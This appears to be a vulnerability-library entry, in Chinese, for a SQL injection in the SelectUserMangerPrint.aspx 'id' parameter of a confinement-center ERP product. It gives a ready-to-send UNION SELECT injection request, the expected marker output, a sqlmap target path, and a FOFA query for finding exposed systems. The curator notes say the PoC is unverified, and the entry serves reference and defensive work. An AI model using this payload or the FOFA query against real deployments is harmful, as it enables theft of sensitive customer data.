---
source: "wy876 漏洞文库"
title: "妈妈宝盒/月子会所ERP SelectUserMangerPrint id SQL 注入"
product: "妈妈宝盒/月子会所ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "示例session未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fef6ey5vk0gh2g2s"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP/%E6%9C%88%E5%AD%90%E4%BC%9A%E6%89%80ERP%E7%AE%A1%E7%90%86%E4%BA%91%E5%B9%B3%E5%8F%B0SelectUserMangerPrint%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "product=\"妈妈宝盒-ERP\""
id: "vw-e8201367e9df980c72d649e0"
entity_id: "ve-e8201367e9df980c72d649e0"
schema_version: "1"
---

# 妈妈宝盒/月子会所ERP SelectUserMangerPrint id SQL 注入

## 条目说明

- 对象与具体问题：妈妈宝盒/月子会所ERP；SelectUserMangerPrint id SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：示例session未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 提供常量表达式与预期串，但无实际响应/正常对照
- HTTP错误java标签，SQLmap部分只是路径不是完整命令
- 缺根因/修复/最低权限；Manger拼写按真实路由保留

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。月子会所ERP管理云平台SelectUserMangerPrint存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感数据。

## 二、影响版本
+ 月子会所ERP管理云平台

## 三、资产测绘
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面


## 四、漏洞复现
```http
GET /Page/SalerManager/SelectUserMangerPrint.aspx?id=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%28113%29%2BCHAR%2870%29%2BCHAR%28108%29%2BCHAR%2883%29%2BCHAR%28111%29%2BCHAR%28106%29%2BCHAR%2888%29%2BCHAR%2878%29%2BCHAR%2884%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28103%29%2BCHAR%28110%29%2BCHAR%28109%29%2BCHAR%2897%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28116%29%2BCHAR%2872%29%2BCHAR%2876%29%2BCHAR%2878%29%2BCHAR%2880%29%2BCHAR%28113%29%2BCHAR%2868%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%2878%29%2BCHAR%2898%29%2BCHAR%2890%29%2BCHAR%28108%29%2BCHAR%28113%29%2BCHAR%2874%29%2BCHAR%2883%29%2BCHAR%2868%29%2BCHAR%2882%29%2BCHAR%28117%29%2BCHAR%2873%29%2BCHAR%2877%29%2BCHAR%2874%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2CNULL--+EfIE HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=mf1ihd
Upgrade-Insecure-Requests: 1
```


```java
qqxbqRqFlSojXNTpzgnmaqktHLNPqDvpNbZlqJSDRuIMJqzvxq
```

sqlmap

```java
/Page/SalerManager/SelectUserMangerPrint.aspx?id=1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fef6ey5vk0gh2g2s>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
